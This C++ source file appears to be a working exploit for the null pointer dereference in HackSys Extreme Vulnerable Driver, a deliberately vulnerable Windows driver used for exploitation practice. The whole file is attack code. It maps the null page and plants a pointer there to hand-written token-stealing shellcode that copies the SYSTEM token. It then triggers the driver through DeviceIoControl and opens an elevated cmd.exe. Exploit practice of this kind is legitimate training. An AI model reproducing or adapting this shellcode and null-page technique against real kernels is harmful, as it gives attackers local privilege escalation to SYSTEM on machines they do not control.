// HEVD-NullPointerDereference.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include <string.h>
#include <stdio.h>
#include <winioctl.h>
#include <stdint.h>
#include <malloc.h>

typedef NTSTATUS(WINAPI *_NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID *BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T AllocationSize,
	ULONG AllocationType,
	ULONG Protect
);

int main()
{
	HANDLE dev = CreateFileA(
		"\\\\.\\HackSysExtremeVulnerableDriver",
		FILE_READ_ACCESS | FILE_WRITE_ACCESS,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING, FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (dev == INVALID_HANDLE_VALUE) {
		return 1;
	}
	
	char Buff[20] = "\xDD\xDD\xDD\xDD";
	DWORD outBytes = 0;

	int baseAddr = 0x1; 
	int allocationSize = 2048; 
	int result = 333; 

	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(
		GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");

	result = NtAllocateVirtualMemory(
		GetCurrentProcess(),
		(PVOID *)&baseAddr,
		0,
		(PSIZE_T)&allocationSize,
		0x3000,
		0x40
	);
	char shellcode[60] = 
		"\x60" 
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50" 
		"\x89\xC1" 
		"\x8B\x98\xF8\x00\x00\x00" 
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00" 
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00" 
		"\x75\xED"                                        
		"\x8B\x90\xF8\x00\x00\x00" 
		"\x89\x91\xF8\x00\x00\x00" 
		"\x61" 
		"\x31\xC0" 
		"\xC3" 
		;
	LPVOID shellcodeAddress = VirtualAlloc(
		NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	memcpy(shellcodeAddress, shellcode, sizeof(shellcode));
	LPVOID theShellcodeAddress = &shellcodeAddress;
	void * returnResult = memcpy((LPVOID)0x00000004, theShellcodeAddress, 4);
	DeviceIoControl(dev, 0x22202B, &Buff, sizeof(Buff), NULL, 0, &outBytes, (LPOVERLAPPED)NULL);
	system("cmd.exe");
	CloseHandle(dev);
	system("pause");
	return 0;
}